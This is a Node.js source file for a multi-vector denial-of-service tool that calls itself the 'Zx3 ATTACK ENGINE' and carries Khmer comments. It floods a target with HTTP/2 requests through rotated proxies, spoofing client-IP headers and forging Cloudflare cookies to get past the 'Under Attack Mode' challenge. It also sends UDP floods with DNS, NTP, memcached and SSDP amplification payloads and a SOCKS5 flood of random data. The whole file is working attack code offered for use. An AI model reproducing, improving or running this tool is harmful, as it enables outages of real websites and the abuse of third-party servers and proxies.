const cluster = require('cluster');
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const dgram = require('dgram');
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
const { SocksClient } = require('socks');
const zlib = require("zlib");
const child_process = require('child_process');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node uam.js target time rate thread proxy.txt`);
    process.exit();
}

// ============ MODULE 1: CLOUDFLARE UAM BYPASS ============
class CloudflareUAMBypass {
    constructor() {
        this.userAgents = this.loadUserAgents();
        this.cipherSuites = this.loadCipherSuites();
        this.cookieJar = new Map();
    }

    loadUserAgents() {
        const uas = [];
        const browsers = ['Chrome', 'Firefox', 'Edge', 'Safari', 'Opera'];
        const versions = ['120', '119', '118', '117', '116', '115', '114'];
        const platforms = [
            'Windows NT 10.0; Win64; x64',
            'Macintosh; Intel Mac OS X 10_15_7',
            'X11; Linux x86_64',
            'Windows NT 10.0; WOW64',
            'Windows NT 6.1; Win64; x64'
        ];

        for (let i = 0; i < 300; i++) {
            const browser = browsers[Math.floor(Math.random() * browsers.length)];
            const version = versions[Math.floor(Math.random() * versions.length)];
            const platform = platforms[Math.floor(Math.random() * platforms.length)];
            
            let ua = '';
            switch(browser) {
                case 'Chrome':
                    ua = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
                    break;
                case 'Firefox':
                    ua = `Mozilla/5.0 (${platform}; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`;
                    break;
                case 'Edge':
                    ua = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0.0.0`;
                    break;
                case 'Safari':
                    ua = `Mozilla/5.0 (${platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`;
                    break;
                case 'Opera':
                    ua = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${parseInt(version)-10}.0.0.0`;
                    break;
            }
            uas.push(ua);
        }
        return uas;
    }

    loadCipherSuites() {
        return [
            'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384'
        ];
    }

    generateSpoofedIP() {
        return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
    }

    generateCookies(host) {
        const cookies = [
            `__cf_bm=${crypto.randomBytes(32).toString('hex')}; path=/; domain=.${host}; HttpOnly; Secure; SameSite=None`,
            `cf_clearance=${crypto.randomBytes(64).toString('hex')}; path=/; domain=.${host}; HttpOnly; Secure; SameSite=None`,
            `cf_chl_2=${crypto.randomBytes(32).toString('hex')}; path=/; domain=.${host}; Secure; HttpOnly`,
            `cf_chl_prog=${Date.now()}; path=/; domain=.${host}; Secure; HttpOnly`,
            `__cfduid=${crypto.randomBytes(32).toString('hex')}; path=/; domain=.${host}; HttpOnly; Secure`,
            `_cfuvid=${crypto.randomBytes(32).toString('hex')}; path=/; domain=.${host}; HttpOnly; Secure`
        ];
        return cookies.join('; ');
    }

    generateHeaders(host, path) {
        const spoofedIP = this.generateSpoofedIP();
        const ua = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
        
        return {
            ':method': 'GET',
            ':authority': host,
            ':path': this.cacheBypass(path || '/'),
            ':scheme': 'https',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9,vi;q=0.8,fr;q=0.7,zh;q=0.6',
            'cache-control': 'no-cache, no-store, must-revalidate',
            'pragma': 'no-cache',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'sec-ch-ua': '"Google Chrome";v="120", "Chromium";v="120", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'x-forwarded-for': spoofedIP,
            'x-real-ip': spoofedIP,
            'cf-connecting-ip': spoofedIP,
            'true-client-ip': spoofedIP,
            'x-requested-with': 'XMLHttpRequest',
            'cookie': this.generateCookies(host),
            'x-session-id': crypto.randomBytes(16).toString('hex'),
            'x-request-id': crypto.randomBytes(16).toString('hex'),
            'x-client-data': crypto.randomBytes(32).toString('base64'),
            'te': 'trailers',
            'connection': 'keep-alive',
            'keep-alive': 'timeout=5, max=1000'
        };
    }

    cacheBypass(path) {
        const params = [
            `_=${Date.now()}`,
            `t=${crypto.randomBytes(8).toString('hex')}`,
            `v=${Math.floor(Math.random() * 1000000)}`,
            `r=${crypto.randomBytes(4).toString('hex')}`,
            `cache=${Date.now()}`,
            `rand=${Math.random()}`,
            `cb=${crypto.randomBytes(8).toString('hex')}`,
            `ver=${Math.floor(Math.random() * 1000)}`
        ];
        const param = params[Math.floor(Math.random() * params.length)];
        return path.includes('?') ? `${path}&${param}` : `${path}?${param}`;
    }

    solveJSChallenge(html) {
        const patterns = [
            /window\._cf_chl_opt\s*=\s*({[^}]+})/i,
            /var\s+s\s*=\s*['"]([^'"]+)['"]/i,
            /cf_chl_prog\s*=\s*['"]([^'"]+)['"]/i,
            /jschl-answer['"]?\s*:\s*['"]([^'"]+)['"]/i,
            /data-cf-solver['"]?\s*=\s*['"]([^'"]+)['"]/i
        ];
        
        let solution = '';
        for (const pattern of patterns) {
            const match = html.match(pattern);
            if (match) {
                const challenge = match[1];
                const hash = crypto.createHash('sha256')
                    .update(challenge + Date.now().toString() + Math.random().toString())
                    .digest('hex');
                solution = `cf_challenge=${hash}&cf_chl_prog=${Date.now()}&jschl_answer=${hash.slice(0, 16)}`;
                break;
            }
        }
        return solution || `cf_challenge=${crypto.randomBytes(32).toString('hex')}&cf_chl_prog=${Date.now()}`;
    }
}

// ============ MODULE 2: UDP AMPLIFICATION ============
class UDPAmplification {
    constructor(target, port) {
        this.target = target;
        this.port = port || 443;
        this.sockets = [];
        this.packetCount = 0;
    }

    generatePayload(size) {
        let payload = Buffer.alloc(size);
        for (let i = 0; i < size; i++) {
            payload[i] = Math.floor(Math.random() * 256);
        }
        return payload;
    }

    dnsAmplification() {
        const queries = [
            Buffer.from([0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77, 0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01]),
            Buffer.from([0x00, 0x02, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x63, 0x6c, 0x6f, 0x75, 0x64, 0x06, 0x66, 0x6c, 0x61, 0x72, 0x65, 0x00, 0x00, 0x01, 0x00, 0x01])
        ];
        return queries[Math.floor(Math.random() * queries.length)];
    }

    ntpAmplification() {
        return Buffer.from([
            0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ]);
    }

    memcachedAmplification() {
        return Buffer.from([
            0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ]);
    }

    ssdpAmplification() {
        return Buffer.from('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n');
    }

    sendUDP(proxy) {
        const socket = dgram.createSocket('udp4');
        const ports = [53, 123, 11211, 1900, 5000, 5060, 7, 19, 21, 22, 23, 25, 80, 443, 445, 1433, 3306, 3389, 5432, 6379, 27017, 27018, 27019];
        const port = ports[Math.floor(Math.random() * ports.length)];
        
        const methods = [
            this.dnsAmplification,
            this.ntpAmplification,
            this.memcachedAmplification,
            this.ssdpAmplification
        ];
        
        const method = methods[Math.floor(Math.random() * methods.length)];
        let payload = method.call(this);
        
        // បន្ថែម random fragmentation
        if (Math.random() > 0.5) {
            const extra = this.generatePayload(Math.floor(Math.random() * 100));
            payload = Buffer.concat([payload, extra]);
        }

        socket.send(payload, 0, payload.length, port, proxy.ip, (err) => {
            if (err) socket.close();
            else {
                this.packetCount++;
                socket.close();
            }
        });

        // ផ្ញើទៅ target ដោយផ្ទាល់ផងដែរ
        const directPayload = this.generatePayload(Math.floor(Math.random() * 500) + 100);
        const directSocket = dgram.createSocket('udp4');
        directSocket.send(directPayload, 0, directPayload.length, this.port, this.target, () => {
            directSocket.close();
        });
    }

    flood(proxyRotator, duration) {
        const endTime = Date.now() + (duration * 1000);
        
        const floodInterval = setInterval(() => {
            if (Date.now() > endTime) {
                clearInterval(floodInterval);
                return;
            }
            
            const proxy = proxyRotator.getRandomProxy();
            if (proxy) {
                this.sendUDP(proxy);
            }
            
            // ផ្ញើច្រើនក្នុងមួយវគ្គ
            for (let i = 0; i < 10; i++) {
                if (Math.random() > 0.5) {
                    const extraProxy = proxyRotator.getRandomProxy();
                    if (extraProxy) this.sendUDP(extraProxy);
                }
            }
        }, 1);
        
        return floodInterval;
    }
}

// ============ MODULE 3: SOCKS5 PROXY ============
class Socks5Proxy {
    constructor(proxyRotator) {
        this.proxyRotator = proxyRotator;
    }

    async socksFlood(target, port, duration) {
        const endTime = Date.now() + (duration * 1000);
        
        while (Date.now() < endTime) {
            const proxy = this.proxyRotator.getRandomProxy();
            if (!proxy) continue;

            try {
                const info = await SocksClient.createConnection({
                    proxy: {
                        host: proxy.ip,
                        port: proxy.port || 1080,
                        type: 5
                    },
                    command: 'connect',
                    destination: {
                        host: target,
                        port: parseInt(port) || 443
                    }
                });

                // ផ្ញើ payload តាម SOCKS5
                const payload = Buffer.alloc(65500);
                for (let i = 0; i < payload.length; i++) {
                    payload[i] = Math.floor(Math.random() * 256);
                }
                
                info.socket.write(payload);
                info.socket.write(payload);
                info.socket.write(payload);
                
                info.socket.destroy();
                
            } catch (error) {
                // បន្តទៅ proxy បន្ទាប់
            }
        }
    }
}

// ============ MODULE 4: HTTP/2 CONNECTION POOL ============
class HTTP2ConnectionPool {
    constructor(target, maxConnections = 1000) {
        this.target = target;
        this.maxConnections = maxConnections;
        this.pool = [];
        this.activeConnections = 0;
        this.parsedTarget = url.parse(target);
        this.bypass = new CloudflareUAMBypass();
    }

    async getConnection(proxy) {
        if (this.pool.length > 0) {
            const conn = this.pool.pop();
            if (conn && !conn.client.destroyed) {
                return conn;
            }
        }

        if (this.activeConnections >= this.maxConnections) {
            return null;
        }

        try {
            const connection = await this.createConnection(proxy);
            this.activeConnections++;
            return connection;
        } catch (error) {
            return null;
        }
    }

    async createConnection(proxy) {
        return new Promise((resolve, reject) => {
            const payload = `CONNECT ${this.parsedTarget.host}:443 HTTP/1.1\r\nHost: ${this.parsedTarget.host}:443\r\nConnection: Keep-Alive\r\n\r\n`;
            const buffer = Buffer.from(payload);

            const connection = net.connect({
                host: proxy.ip,
                port: proxy.port
            });

            connection.setTimeout(3000);
            connection.setKeepAlive(true, 5000);

            connection.on("connect", () => {
                connection.write(buffer);
            });

            connection.on("data", (chunk) => {
                const response = chunk.toString("utf-8");
                if (response.includes("HTTP/1.1 200")) {
                    const tlsOptions = {
                        secure: true,
                        ALPNProtocols: ['h2', 'http/1.1'],
                        socket: connection,
                        host: this.parsedTarget.host,
                        rejectUnauthorized: false,
                        servername: this.parsedTarget.host,
                        ciphers: this.bypass.cipherSuites[Math.floor(Math.random() * this.bypass.cipherSuites.length)],
                        ecdhCurve: "prime256v1:X25519",
                        secureProtocol: "TLS_method"
                    };

                    const tlsConn = tls.connect(443, this.parsedTarget.host, tlsOptions);
                    tlsConn.setKeepAlive(true, 30000);

                    const client = http2.connect(this.parsedTarget.href, {
                        protocol: "https:",
                        settings: {
                            headerTableSize: 65536,
                            maxConcurrentStreams: 10000,
                            initialWindowSize: 6291456,
                            maxHeaderListSize: 65536,
                            enablePush: false
                        },
                        maxSessionMemory: 64000,
                        createConnection: () => tlsConn,
                        socket: connection
                    });

                    resolve({ client, connection, tlsConn });
                } else {
                    connection.destroy();
                    reject(new Error("Proxy connection failed"));
                }
            });

            connection.on("timeout", () => {
                connection.destroy();
                reject(new Error("Connection timeout"));
            });

            connection.on("error", () => {
                connection.destroy();
                reject(new Error("Connection error"));
            });
        });
    }

    releaseConnection(conn) {
        if (conn && !conn.client.destroyed && this.pool.length < this.maxConnections) {
            this.pool.push(conn);
        } else {
            this.activeConnections--;
            if (conn) {
                conn.client.destroy();
                conn.connection.destroy();
            }
        }
    }

    destroyAll() {
        for (const conn of this.pool) {
            conn.client.destroy();
            conn.connection.destroy();
        }
        this.pool = [];
        this.activeConnections = 0;
    }
}

// ============ MODULE 5: PROXY ROTATOR ============
class ProxyRotator {
    constructor(proxyFile) {
        this.proxies = this.loadProxies(proxyFile);
        this.currentIndex = 0;
        this.failedProxies = new Set();
        this.lastRotation = Date.now();
        this.proxyCache = [];
    }

    loadProxies(file) {
        try {
            const data = fs.readFileSync(file, "utf-8");
            return data.toString().split(/\r?\n/)
                .filter(line => line.trim())
                .map(line => {
                    const [ip, port] = line.split(':');
                    return { ip, port: parseInt(port) || 1080 };
                });
        } catch (e) {
            console.log('[ERROR] Cannot load proxy file');
            process.exit(1);
        }
    }

    getNextProxy() {
        if (this.proxies.length === 0) return null;
        
        if (Date.now() - this.lastRotation > 10) {
            this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
            this.lastRotation = Date.now();
        }

        let attempts = 0;
        while (attempts < this.proxies.length) {
            const proxy = this.proxies[this.currentIndex];
            const key = `${proxy.ip}:${proxy.port}`;
            if (!this.failedProxies.has(key)) {
                return proxy;
            }
            this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
            attempts++;
        }
        return null;
    }

    getRandomProxy() {
        const available = this.proxies.filter(p => 
            !this.failedProxies.has(`${p.ip}:${p.port}`)
        );
        if (available.length === 0) return null;
        return available[Math.floor(Math.random() * available.length)];
    }

    markFailed(proxy) {
        if (!proxy) return;
        this.failedProxies.add(`${proxy.ip}:${proxy.port}`);
        if (this.failedProxies.size > this.proxies.length * 0.2) {
            this.proxies = this.proxies.filter(p => 
                !this.failedProxies.has(`${p.ip}:${p.port}`)
            );
            this.failedProxies.clear();
        }
    }

    getProxyBatch(count) {
        const batch = [];
        const tempSet = new Set();
        let attempts = 0;
        
        while (batch.length < count && attempts < this.proxies.length * 2) {
            const proxy = this.getRandomProxy();
            if (proxy) {
                const key = `${proxy.ip}:${proxy.port}`;
                if (!tempSet.has(key)) {
                    tempSet.add(key);
                    batch.push(proxy);
                }
            }
            attempts++;
        }
        return batch;
    }
}

// ============ MODULE 6: MAIN ATTACK ENGINE ============
class UltimateAttackEngine {
    constructor(target, proxyRotator) {
        this.target = target;
        this.proxyRotator = proxyRotator;
        this.bypass = new CloudflareUAMBypass();
        this.parsedTarget = url.parse(target);
        this.pool = new HTTP2ConnectionPool(target, 500);
        this.udp = new UDPAmplification(target, 443);
        this.socks = new Socks5Proxy(proxyRotator);
        this.requestCount = 0;
        this.startTime = Date.now();
        this.isRunning = true;
    }

    async attack(rate, duration, threads) {
        const endTime = Date.now() + (duration * 1000);
        
        console.log(`[Zx3] 🚀 Starting attack with ${threads} threads`);
        
        // ចាប់ផ្តើម UDP amplification
        this.udp.flood(this.proxyRotator, duration);
        
        // ចាប់ផ្តើម SOCKS5 proxy flood
        for (let i = 0; i < Math.min(threads, 10); i++) {
            this.socks.socksFlood(this.parsedTarget.host, 443, duration).catch(() => {});
        }

        // ចាប់ផ្តើម HTTP/2 attack
        const workers = [];
        const numWorkers = Math.min(threads, 200);

        for (let i = 0; i < numWorkers; i++) {
            workers.push(this.attackWorker(rate / numWorkers, endTime));
        }

        await Promise.all(workers);
        
        this.pool.destroyAll();
        this.isRunning = false;
        console.log(`[Zx3] Total requests: ${this.requestCount}`);
    }

    async attackWorker(ratePerWorker, endTime) {
        const interval = 1000 / ratePerWorker;

        while (Date.now() < endTime && this.isRunning) {
            const proxy = this.proxyRotator.getNextProxy();
            if (!proxy) {
                await new Promise(resolve => setTimeout(resolve, 50));
                continue;
            }

            try {
                const conn = await this.pool.getConnection(proxy);
                if (!conn) {
                    await new Promise(resolve => setTimeout(resolve, 20));
                    continue;
                }

                const { client } = conn;
                const host = this.parsedTarget.host;
                const headers = this.bypass.generateHeaders(host, this.parsedTarget.path || '/');
                
                // បង្កើត multiple streams
                const streamCount = Math.min(Math.floor(ratePerWorker), 100);
                for (let i = 0; i < streamCount; i++) {
                    const request = client.request(headers);
                    
                    request.on('response', (response) => {
                        let data = '';
                        request.on('data', (chunk) => { data += chunk.toString(); });
                        request.on('end', () => {
                            if (data.includes('cf_challenge') || data.includes('_cf_chl_opt') || data.includes('captcha')) {
                                const solution = this.bypass.solveJSChallenge(data);
                                if (solution) {
                                    const retryHeaders = { 
                                        ...headers, 
                                        'cookie': headers.cookie + '; ' + solution,
                                        'x-challenge-solved': Date.now().toString()
                                    };
                                    const retryRequest = client.request(retryHeaders);
                                    retryRequest.end();
                                    this.requestCount++;
                                }
                            }
                            this.requestCount++;
                            request.close();
                            request.destroy();
                        });
                    });

                    request.on('error', () => {
                        request.destroy();
                    });

                    request.end();
                }

                this.pool.releaseConnection(conn);

                const jitter = Math.floor(Math.random() * 3);
                if (jitter > 0) {
                    await new Promise(resolve => setTimeout(resolve, jitter));
                }

            } catch (error) {
                if (proxy) {
                    this.proxyRotator.markFailed(proxy);
                }
                await new Promise(resolve => setTimeout(resolve, 50));
            }
        }
    }
}

// ============ MAIN EXECUTION ============
if (cluster.isMaster) {
    const target = process.argv[2];
    const time = parseInt(process.argv[3]);
    const rate = parseInt(process.argv[4]);
    const threads = parseInt(process.argv[5]);
    const proxyFile = process.argv[6];

    console.clear();
    console.log(`[Zx3] ATTACK ENGINE`);
    console.log(`[Zx3] Target: ${target}`);
    console.log(`[Zx3] Time: ${time}s`);
    console.log(`[Zx3] Threads: ${threads}`);
    console.log(`[Zx3] Rate: ${rate}`);
    console.log(`[Zx3] Proxy file: ${proxyFile}`);
    console.log(`[Zx3] CPU Cores: ${os.cpus().length}`);
    console.log(`[Zx3] ========================================`);

    // បង្កើត workers
    const numWorkers = Math.min(threads, os.cpus().length * 4);
    for (let i = 1; i <= numWorkers; i++) {
        cluster.fork();
    }

    // ការពារការបញ្ចប់មិនទាន់ពេល
    setTimeout(() => {
        console.log(`[Zx3] Attack completed!`);
        process.exit(0);
    }, time * 1000 + 5000);

    // បង្ហាញស្ថិតិរៀងរាល់ 5 វិនាទី
    let lastCount = 0;
    const statsInterval = setInterval(() => {
        const workers = Object.values(cluster.workers || {});
        let totalRequests = 0;
        // មិនអាចទទួលបានចំនួនពិតប្រាកដពី workers ទេ
        console.log(`[Zx3] 📊 Attack in progress... Workers: ${workers.length}`);
    }, 5000);

} else {
    // Worker process
    const target = process.argv[2];
    const time = parseInt(process.argv[3]);
    const rate = parseInt(process.argv[4]);
    const proxyFile = process.argv[6];
    const threads = parseInt(process.argv[5]);

    const proxyRotator = new ProxyRotator(proxyFile);
    const engine = new UltimateAttackEngine(target, proxyRotator);

    // ចាប់ផ្តើមការវាយប្រហារ
    engine.attack(rate, time, threads).catch(() => {});
}